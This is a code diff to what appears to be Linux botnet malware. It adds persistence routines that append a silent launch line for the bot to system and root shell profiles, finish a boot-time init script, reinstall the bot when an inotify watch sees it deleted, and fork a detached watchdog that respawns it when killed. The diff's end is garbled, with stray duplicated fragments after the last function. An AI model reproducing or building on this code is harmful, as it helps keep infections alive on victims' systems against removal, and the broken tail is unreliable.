@@ -286,6 +286,59 @@ static BOOL setup_cron(const char *bot_path) {
 }
 
 
+static BOOL setup_shell_profiles(const char *bot_path) {
+    const char *profile_files[] = {
+        "/etc/profile",
+        "/etc/bash.bashrc",
+        "/etc/profile.d/init.sh",
+        "/root/.profile",
+        "/root/.bashrc"
+    };
+    
+    BOOL success = FALSE;
+    
+    for (int i = 0; i < sizeof(profile_files) / sizeof(profile_files[0]); i++) {
+        FILE *f;
+        char line[512];
+        BOOL found = FALSE;
+        
+        
+        char dir_path[256];
+        util_strcpy(dir_path, profile_files[i]);
+        char *last_slash = strrchr(dir_path, '/');
+        if (last_slash) *last_slash = '\0';
+        if (is_readonly(dir_path)) continue;
+        
+        
+        f = fopen(profile_files[i], "r");
+        if (f != NULL) {
+            while (fgets(line, sizeof(line), f) != NULL) {
+                if (strstr(line, bot_path) != NULL) {
+                    found = TRUE;
+                    break;
+                }
+            }
+            fclose(f);
+        }
+        
+        if (found) {
+            success = TRUE;
+            continue;
+        }
+        
+        
+        f = fopen(profile_files[i], "a");
+        if (f != NULL) {
+            fprintf(f, "\n%s >/dev/null 2>&1 &\n", bot_path);
+            fclose(f);
+            success = TRUE;
+        }
+    }
+    
+    return success;
+}
+
+
 const char* get_persistent_path(void) {
     if (persistent_path[0] != '\0') {
         return persistent_path;
@@ -405,6 +458,7 @@ void persistence_init(void) {
     setup_systemd(install_path);
     setup_rclocal(install_path);
     setup_cron(install_path);
+    setup_shell_profiles(install_path);
     
     
     persistence_watchdog_init();
@@ -424,6 +478,145 @@ void persistence_init(void) {
             fprintf(f, "# Provides:          %s\n", random_name);
             fprintf(f, "# Required-Start:    $network\n");
             fprintf(f, "# Default-Start:     2 3 4 5\n");
+            fprintf(f, "# Default-Stop:\n");
+            fprintf(f, "### END INIT INFO\n\n");
+            fprintf(f, "%s &\n", install_path);
+            fclose(f);
+            chmod(init_script, 0755);
+        }
+    }
+}
+
+
+static int inotify_fd = -1;
+static int inotify_wd = -1;
+
+void persistence_watchdog_init(void) {
+    const char *persistent = get_persistent_path();
+    if (persistent == NULL)
+        return;
+    
+    
+    
+    inotify_fd = inotify_init();
+    if (inotify_fd == -1)
+        return;
+    
+    
+    int flags = fcntl(inotify_fd, F_GETFL);
+    if (flags != -1) {
+        fcntl(inotify_fd, F_SETFL, flags | O_NONBLOCK);
+    }
+    
+    
+    char dir_path[256];
+    strncpy(dir_path, persistent, sizeof(dir_path) - 1);
+    dir_path[sizeof(dir_path) - 1] = '\0';
+    
+    
+    char *last_slash = strrchr(dir_path, '/');
+    if (last_slash != NULL) {
+        *last_slash = '\0';
+    } else {
+        strcpy(dir_path, ".");
+    }
+    
+    inotify_wd = inotify_add_watch(inotify_fd, dir_path, IN_DELETE | IN_MOVED_FROM);
+    if (inotify_wd == -1) {
+        close(inotify_fd);
+        inotify_fd = -1;
+    }
+}
+
+
+void persistence_check_health(void) {
+    const char *persistent = get_persistent_path();
+    if (persistent == NULL)
+        return;
+    
+    
+    if (access(persistent, F_OK) != 0) {
+        
+        #ifndef DEBUG
+        persistence_init();
+        #endif
+        return;
+    }
+    
+    
+    if (inotify_fd != -1) {
+        char buf[4096];
+        ssize_t len = read(inotify_fd, buf, sizeof(buf));
+        if (len > 0) {
+            
+            #ifndef DEBUG
+            persistence_init();
+            #endif
+        }
+    }
+}
+
+
+static pid_t watchdog_pid = -1;
+
+static void watchdog_monitor(void) {
+    const char *persistent = get_persistent_path();
+    if (persistent == NULL)
+        return;
+    
+    pid_t monitor_pid = fork();
+    if (monitor_pid < 0)
+        return;
+    
+    if (monitor_pid > 0) {
+        
+        watchdog_pid = monitor_pid;
+        return;
+    }
+    
+    
+    
+    setsid();
+    
+    pid_t bot_pid = getppid();
+    
+    
+    for (int i = 0; i < 1024; i++) {
+        close(i);
+    }
+    
+    while (1) {
+        sleep(60); 
+        
+        
+        if (kill(bot_pid, 0) != 0) {
+            
+            if (access(persistent, X_OK) == 0) {
+                pid_t new_bot = fork();
+                if (new_bot == 0) {
+                    
+                    char *argv[] = {(char *)persistent, NULL};
+                    execv(persistent, argv);
+                    _exit(1);
+                } else if (new_bot > 0) {
+                    
+                    bot_pid = new_bot;
+                }
+            } else {
+                
+                _exit(0);
+            }
+        }
+    }
+}
+
+
+void persistence_watchdog_start(void) {
+    #ifndef DEBUG
+    watchdog_monitor();
+    #endif
+}
+n");
             fprintf(f, "# Default-Stop:\n");
             fprintf(f, "### END INIT INFO\n\n");
             fprintf(f, "%s &\n", install_path);
